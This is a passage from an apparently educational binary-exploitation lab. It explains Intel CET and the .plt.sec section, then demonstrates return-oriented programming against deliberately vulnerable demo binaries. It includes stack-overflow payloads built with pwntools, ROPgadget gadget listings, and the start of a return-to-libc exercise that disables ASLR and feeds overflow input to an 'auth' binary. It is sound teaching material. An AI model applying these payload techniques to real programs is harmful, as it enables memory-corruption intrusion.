Well, <code>.plt.sec</code> is an x86-only security enhancement of the <code>.plt</code> section (hence the <code>.sec</code> part of the name, duh...), that is used only when a security enhancement feature called <strong>CET (Control-flow Enforcement Technology)</strong> is enabled.
In this comment, I&#x27;ll explain what the feature is and why we have two PLT sections if CET is enabled.</p><p>So, what does CET do?
CET introduces a new restriction to indirect jump instructions.
In order to understand how CET works, let&#x27;s assume that it is enabled.
Then, if you execute an indirect jump instruction, the processor verifies that a special &quot;landing pad&quot; instruction, which is actually a repurposed <code>NOP</code> instruction (now called <code>endbr32</code> or <code>endbr64</code>, as you can see in the above snippets), is at the jump target.
If the jump target does not start with that instruction, the processor raises an exception instead of continuing to execute code.</p><p>If CET is enabled, the compiler places <code>endbr</code> instructions to all locations where indirect jumps may lead.
This mechanism makes it extremely hard to transfer the control to a middle of a function that is not supported to be a indirect jump target, preventing certain types of attacks, such as <code>ROP</code> or JOP (jump-oriented programming; very similar to <code>ROP</code>).</p><p>Now, let&#x27;s explain why we have this extra PLT section for when CET is enabled.
Since you can indirectly jump to a PLT entry, we have to make PLT entries start with an <code>endbr</code> instruction.
The problem is there was no extra space for <code>endbr</code> (which is 4 bytes long) in the old <code>.plt</code> entry schema, as the PLT entry is only 16 bytes long and all of them are already used.</p><p>In order to deal with the issue, each PLT entry was split into two separate entries.
Remember that each PLT entry contains code to jump to an address read from <code>.got.plt</code> <strong>AND</strong> code to resolve a dynamic symbol lazily.
With the 2-PLT schema, the former code is written to <code>.plt.sec</code>, and the latter code is written to <code>.plt</code>, as demonstrated above.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="more-about-cet-and-endbr">More about CET and <code>endbr</code><a class="hash-link" href="#more-about-cet-and-endbr" title="Direct link to heading">​</a></h4><ul><li>A more in-depth look at the inner workings of CET and the concept of the <strong>Shadow Stack</strong> that it uses, can be found <a href="https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html" target="_blank" rel="noopener noreferrer">here</a> and <a href="https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html" target="_blank" rel="noopener noreferrer">here</a></li><li>The way <code>endbr</code> instructions interact with the CPU is explained <a href="https://cdrdv2.intel.com/v1/dl/getContent/631121" target="_blank" rel="noopener noreferrer">here</a>, at page 38</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="tldr">TLDR<a class="hash-link" href="#tldr" title="Direct link to heading">​</a></h4><p>Lazy symbol resolution in the 2-PLT schema works in the usual way, except that the regular <code>.plt</code> is now called <code>.plt.sec</code> and <code>.plt</code> is repurposed to contain only code for lazy symbol resolution.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="putting-it-all-together-demo">Putting it All Together: Demo<a class="hash-link" href="#putting-it-all-together-demo" title="Direct link to heading">​</a></h2><p>Now that we&#x27;ve learned the theoretical aspects of what Return-Oriented Programming is, let&#x27;s put everything in practice as part of a demo.</p><p>Navigate to the folder <a href="/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/activities/00-demo">00-demo</a>.
Notice that it contains two executables, one compiled for 32 bits (<code>vuln</code>) and the other for 64 bits (<code>vuln64</code>).</p><p>Looking at their source code (it&#x27;s one and the same for both of them), we can easily identify their vulnerability: the <code>reader</code> function reads (duh...) 128 bytes from <code>stdin</code> into a buffer whose capacity is only 64 bytes.
So we&#x27;ll be able to overflow this buffer.
We aim to do this in order to showcase the concept of <strong>code reuse</strong>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="calling-a-function">Calling a Function<a class="hash-link" href="#calling-a-function" title="Direct link to heading">​</a></h3><p>The most basic type of code reuse is calling a function.
For this, we&#x27;ll be calling the <code>warcraft</code> function in the <code>vuln</code> and <code>vuln64</code> binaries mentioned above.</p><p>In order to do this, we&#x27;ll need to know:</p><ul><li>the offset of the return address inside our buffer</li><li>the address of the <code>warcraft</code> function inside the binary.</li></ul><p>For all our exploits we&#x27;ll be using the <code>exploit.py</code> script, which is also available in the <a href="/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/activities/00-demo">00-demo</a> folder.
Notice that <code>pwntools</code> provides a functionality similar to <code>nm</code>, by which we can obtain the addresses of various symbols in the binary (as long as it hasn&#x27;t been stripped):</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">warcraft_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbols</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">b&quot;warcraft&quot;</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As of now, requirement #2 mentioned above is complete.
In order to also complete the first requirement, we&#x27;ll use <code>objdump</code> and check the <code>reader</code> function:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -M intel -d vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">08048529 &lt;reader&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048529:       55                      push   ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804852a:       89 e5                   mov    ebp,esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804852c:       83 ec 40                sub    esp,0x40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> [...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804853c:       a1 40 a0 04 08          mov    eax,ds:0x804a040</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048541:       50                      push   eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048542:       68 80 00 00 00          push   0x80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048547:       8d 45 c0                lea    eax,[ebp-0x40]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804854a:       50                      push   eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804854b:       e8 10 fe ff ff          call   8048360 &lt;fgets@plt&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Our vulnerable buffer is the first parameter of <code>fgets</code>, which is at offset <code>ebp - 0x40</code> i.e. <code>ebp - 64</code>.
Which means that the offset of the return address is <code>64 + 4 = 68</code> bytes into this buffer (remember how a stack frame looks like).</p><p>So, in order to call the <code>warcraft</code> function, we&#x27;ll give our binary a payload made up of a padding of 68 bytes, followed by the address of <code>warcraft</code>, written in little endian representation, which can be written like this:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">warcraft_address</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now our exploit is done.
In order to perform this exploit on <code>vuln64</code>, simply run <code>objdump</code> on this binary and remember that the length of a pointer on a 64-bit architecture is 8 bytes, which means that the offset of the return address is going to be <code>rbp + 8</code>.</p><p>One thing to keep in mind is that you are by no means required to use addresses that point to the beginning of functions in your payloads.
You can use any valid address from the <code>.text</code> section and the exploit should work just fine in executing code from the address you provide it.</p><p>Now on to our next scenario: what if the function we&#x27;re calling requires a parameter?</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="calling-a-function-with-parameters">Calling a Function with Parameters<a class="hash-link" href="#calling-a-function-with-parameters" title="Direct link to heading">​</a></h3><p>Let&#x27;s first look at the stack of a function when it&#x27;s called &quot;normally&quot;, i.e. with a <code>call</code> instruction.
Let&#x27;s use the <code>overwatch</code> function in <code>vuln.c</code> as an example.
The picture below shows where its parameter is placed.</p><p><img loading="lazy" alt="Overwatch Stack" src="/binary-security/assets/images/overwatch_stack_simple-1c37527445225546b5c98e6a97ec363c.png" width="791" height="296" class="img_ev3q"></p><p>Furthermore, as expected, the function retrieves its parameter from address <code>ebp + 8</code>, as shown above.
How can we craft a payload so that, upon entering the function, the required <code>0xdeadbeef</code> parameter is where the function expects it to be?</p><p>We&#x27;ll obviously need to place <code>0xdeadbeef</code> on the stack (in little endian representation, of course), but where?
After the function&#x27;s preamble (<code>push ebp; mov esp, ebp</code>), <code>ebp</code> points to the location where the previous stack pointer it saved.
Above it, the function expects to find its return address.
Thus, we need to write 4 padding bytes in its place.
The next 4 bytes are the first parameter.
Just for reference, the next 4 bytes (<code>ebp + 12</code>) are the second parameter and so on.
So, in order to call <code>overwatch</code> with the <code>0xdeadbeef</code> parameter, the payload would look like this:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overwatch_address</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;B&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Take a look at those 4 <code>B</code>&#x27;s in the payload above.
We agreed that they are <code>overwatch</code>&#x27;s expected return address.
So if we wanted to call another function, we would only need to replace them with that function&#x27;s address.
Pretty simple, right?
But what if we wanted to call a third function?
Well, then we would need to overwrite the next 4 bytes in our payload with a third address.
Easy!
But now we have actually run into trouble: the next 4 bytes are <code>overwatch</code>&#x27;s parameter.
In this situation it looks like we <strong>either</strong> call <code>overwatch</code> or we call a third function.
Not cool.
In this case, <code>overwatch</code>s stack would look like this:</p><p><img loading="lazy" alt="Overwatch Stack with Conflicting Parameter/Address" src="/binary-security/assets/images/overwatch_stack_conflict-76e06dfbb2b9d3135db672df76503b5e.png" width="791" height="296" class="img_ev3q"></p><p>It seems we need another mechanism so that we can call <strong>all 3 functions</strong> with all their correct parameters.
Enter <code>ROP</code>s!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="calling-multiple-functions">Calling Multiple Functions<a class="hash-link" href="#calling-multiple-functions" title="Direct link to heading">​</a></h3><p>What we need in order to solve the dilemma presented above is a means by which to <strong>remove</strong> <code>overwatch</code>&#x27;s parameter (i.e.  <code>0xdeadbeef</code>) from the stack once the function is finished.
We know that the <code>pop</code> instruction is good for removing stuff from the stack.
So what we need is to execute the following two instructions:</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pop &lt;any_register&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Since <code>ret</code> is equivalent to <code>pop eip</code>, the above code removes <code>0xdeadbeef</code> from the stack and places the instruction pointer (<code>eip</code>) at the address lying on the stack above <code>0xdeadbeef</code>.
One thing to keep in mind is that now we&#x27;re only interested in clearing the stack, so <code>pop</code> can be used with any 32 bit register.</p><p>As a result, <code>overwatch</code>&#x27;s stack should look like the one in the image below.
Notice there are no more conflicts now.
Hurrah!</p><p><img loading="lazy" alt="Overwatch Stack without Conflicting Parameters and Addresses" src="/binary-security/assets/images/overwatch_stack_no_conflict-ea5f3850a718378846547dbfbef9c5cc.png" width="791" height="376" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="finding-gadgets---ropgadget">Finding Gadgets - <code>ROPgadget</code><a class="hash-link" href="#finding-gadgets---ropgadget" title="Direct link to heading">​</a></h4><p>The <code>pop; ret</code> instructions above are called a <strong>gadget</strong>, i.e. a small group of <strong>consecutive</strong> instructions that ends in <code>ret</code> and which can be used to alter the execution of a given program.
Since all binaries contain a <code>.text</code> section, which is made up of instructions, all binaries contain gadgets.
Lots of them.</p><p>The tool that we&#x27;re going to use in order to find such gadgets is called <code>ROPgadget</code>.
It is already installed in the Kali VM and if you&#x27;re working on another environment, you can install it by following the instructions in the tool&#x27;s <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreferrer">GitHub repository</a>.</p><p>In order to run <code>ROPgadget</code> from your terminal, you need to specify a binary file to it using the <code>--binary</code> parameter.
It is also recommended (if you know what gadgets you&#x27;re looking for) to filter those you need using the <code>--only</code> parameter.
As a result, in order to obtain a <code>pop; ret</code> gadget, we need to run the following command:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ROPgadget --binary vuln --only &quot;pop|ret&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Gadgets information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080485eb : pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080485e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08048331 : pop ebx ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080485ea : pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080485e9 : pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804831a : ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804819c : ret 0x3e41</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804844e : ret 0xeac1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thus, the payload needed in order to call both <code>overwatch</code> and <code>warcraft</code> is the one showcased below, with <code>pop_ret_gadget_address</code> being set to <code>0x08048331</code> from the output above.</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overwatch_address</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_ret_gadget_address</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">warcraft_address</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Notice this yet is another example of <strong>code reuse</strong> since we&#x27;re reusing various chunks of instructions already present in our binary.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="challenges">Challenges<a class="hash-link" href="#challenges" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="01-tutorial---bypass-nx-stack-with-return-to-libc">01. Tutorial - Bypass NX Stack with return-to-libc<a class="hash-link" href="#01-tutorial---bypass-nx-stack-with-return-to-libc" title="Direct link to heading">​</a></h3><p>Go to the <a href="/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/activities/01-tutorial-ret-to-libc/src/"><code>01-tutorial-ret-to-libc/</code></a> folder.</p><p>In the previous sessions we used stack overflow vulnerabilities to inject new code into a running process (on its stack) and redirect execution to it.
This attack is easily defeated by making the stack, together with any other memory page that can be modified, non-executable.
This is achieved by setting the <code>NX</code> bit in the page table of the current process.</p><p>We will try to bypass this protection for the <code>01-tutorial-ret-to-libc/src/auth</code> binary in the lab archive.
For now, disable ASLR in the a new shell:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setarch $(uname -m) -R /bin/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s take a look at the program headers and confirm that the stack is no longer executable.
We only have read and write (RW) permissions for the stack area.
The auth binary requires the <code>libssl1.0.0:i386</code> Debian package to work.
You can find <code>libssl1.0.0:i386</code> Debian package <a href="https://packages.debian.org/jessie/i386/libssl1.0.0/download" target="_blank" rel="noopener noreferrer">here</a>.</p><p>First, let&#x27;s check that <code>NX</code> bit we mentioned earlier:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ checksec auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python2.7 -c &#x27;print &quot;A&quot; * 1357&#x27; | ltrace -i ./auth</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Check the source file - the buffer length is 1337 bytes.
There should be a base pointer and the <code>main()</code>&#x27;s return address just before it on the stack.
There is also some alignment involved, but we can easily try a few lengths to get the right position of the return address.
Seems to be 1337 + 16 followed by the return address for this case.
You can, of course, determine the distance between the buffer&#x27;s start address and the frame&#x27;s return address exactly using objdump, but we will leave that as an exercise.</p><p>We can now jump anywhere.
Unfortunately, we cannot put a shellcode in the buffer and jump into it because the stack is non-executable now.
Lets try it with a few <code>NOP</code>s.
Our buffer&#x27;s address is <code>0xbfffee63</code> (see the <code>gets()</code> call).</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python2.7 -c &#x27;print &quot;\x90\x90\x90\x90&quot; + &quot;A&quot; * 1349 + &quot;\x63\xee\xff\xbf&quot;&#x27; | ltrace -i ./auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 &lt;unfinished ...&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x8048601] malloc(20)                                                                            = 0x0804b008</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x80485df] puts(&quot;Enter password: &quot;Enter password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)                                                              = 17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7)                        = 0xbfffee63</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x8048652] memset(0x0804b008, &#x27;\000&#x27;, 20)                                                        = 0x0804b008</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001)                                       = 0x804b008</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0xbfffee63] --- SIGSEGV (Segmentation fault) ---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[0xffffffff] +++ killed by SIGSEGV +++</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Guess what?
It didn&#x27;t work.
How about we try to jump to some existing code?
